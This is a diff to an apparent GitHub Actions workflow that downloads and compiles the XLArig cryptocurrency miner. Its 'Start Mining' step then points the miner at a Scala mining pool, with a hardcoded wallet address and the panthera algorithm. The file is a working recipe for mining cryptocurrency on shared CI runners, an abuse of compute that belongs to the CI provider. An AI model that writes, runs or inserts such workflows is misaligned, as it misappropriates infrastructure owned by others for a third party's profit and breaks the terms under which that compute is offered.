@@ -9,17 +9,22 @@ jobs:
     steps:
     - name: Install dependencies
       run: |
-        sudo apt update
-        sudo apt install -y wget tar
+        sudo apt-get update
+        sudo apt-get install -y wget tar build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
-    - name: Download XMRig
+    - name: Download XLArig v5.2.4
       run: |
-        wget https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz
-        tar -xvzf xmrig-6.23.0-linux-static-x64.tar.gz
-        cd xmrig
-        chmod +x xmrig
+        wget https://github.com/scala-network/XLArig/archive/refs/tags/v5.2.4.tar.gz
+        tar -xvzf v5.2.4.tar.gz
+        cd XLArig-5.2.4
+        mkdir build && cd build
+        cmake ..
+        make
+      continue-on-error: false
 
     - name: Start Mining
       run: |
-        cd xmrig
-        ./xmrig -o pool.scalaproject.io:2019 -u Ssy2SFtR3rGfjKFA4xxUnGVikpSy7GyfTFbDmjyqSGsuJMJ4K2GSKyK6pApbCy7DBGgf6b5p3fHwV1zHrnVRUjDG7kdm496A8R -p github -a panthera -k --tls
+        cd XLArig-5.2.4/build
+        ./xlarig -o pool.scalaproject.io:2019 -u Ssy2SFtR3rGfjKFA4xxUnGVikpSy7GyfTFbDmjyqSGsuJMJ4K2GSKyK6pApbCy7DBGgf6b5p3fHwV1zHrnVRUjDG7kdm496A8R -p github -a panthera -k --tls
+      env:
+        XLARIG_LOG_LEVEL: 2
